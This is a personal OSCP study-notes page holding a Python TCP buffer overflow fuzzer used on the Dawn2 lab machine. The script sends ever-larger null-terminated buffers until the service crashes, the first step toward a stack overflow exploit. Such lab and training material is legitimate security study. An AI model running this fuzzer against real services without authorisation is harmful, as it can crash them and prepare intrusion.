# tcp_bof_fuzzer.py

Sends incrementally larger null-terminated buffers to a TCP service until it stops responding. The crash size gives an upper bound for `msf-pattern_create`. Configure target, step size, and null-terminator at the top of the script.

**Location on disk:** `OSCP/TOOLS/tcp_bof_fuzzer.py`

**Usage:**

```bash
# Edit TARGET_IP, TARGET_PORT, NULL_TERMINATE at the top of the script, then:
python3 ~/Documents/Obsidian/main-vault/OSCP/TOOLS/tcp_bof_fuzzer.py
```

> ⚠ Single-shot services (e.g. Dawn2 TCP/1985) crash permanently and do not restart. Run the fuzzer against a local Wine instance only -- never against the remote target.

---

## Script

```python
#!/usr/bin/env python3
"""
tcp_bof_fuzzer.py -- Generic TCP buffer overflow fuzzer

Usage:
    python3 ~/Documents/Obsidian/main-vault/OSCP/TOOLS/tcp_bof_fuzzer.py

Configure TARGET_IP, TARGET_PORT, and TERMINATOR below before running.

Notes:
  - Sends incrementally larger buffers until the service stops responding.
  - The crash size gives an upper bound for msf-pattern_create length.
  - SINGLE-SHOT SERVICES: some services (e.g. Dawn2 TCP/1985) crash and do NOT
    restart automatically. If the service is single-shot, do NOT use this fuzzer
    against the remote target. Run it locally under Wine/gdb instead.
  - NULL_TERMINATE: set True if the README or behaviour testing shows the service
    expects a null byte to mark end-of-message (e.g. Dawn2 README).

Seen in: Dawn2 (PG Practice)
"""

import socket
import time

# -- CONFIGURE --
TARGET_IP      = "127.0.0.1"   # $BoxIP or 127.0.0.1 for local Wine test
TARGET_PORT    = 1985
STEP           = 100            # bytes to add each round
MAX            = 2000           # stop if no crash by here
DELAY          = 0.5            # seconds between sends
NULL_TERMINATE = True           # append \x00 to each payload

# -- FUZZER --
print(f"[*] Fuzzing {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Step: {STEP}  Max: {MAX}  Null-terminate: {NULL_TERMINATE}")
print()

for size in range(STEP, MAX + 1, STEP):
    payload = b"A" * size
    if NULL_TERMINATE:
        payload += b"\x00"

    try:
        with socket.create_connection((TARGET_IP, TARGET_PORT), timeout=3) as s:
            s.sendall(payload)
            time.sleep(DELAY)
            try:
                resp = s.recv(1024)
                print(f"[+] {size:>5} bytes -- got response: {resp[:30]}")
            except Exception:
                print(f"[+] {size:>5} bytes -- sent (no response data)")
    except Exception as e:
        print(f"[!] {size:>5} bytes -- NO RESPONSE ({e})")
        print(f"\n[*] Likely crash between {size - STEP} and {size} bytes")
        print(f"[*] Use msf-pattern_create -l {size} for exact offset")
        break
else:
    print(f"\n[?] No crash detected up to {MAX} bytes -- try a larger MAX")
```

## External Resources

- https://github.com/JonathanSalwan/ROPgadget
- https://book.hacktricks.xyz/binary-exploitation/stack-overflow
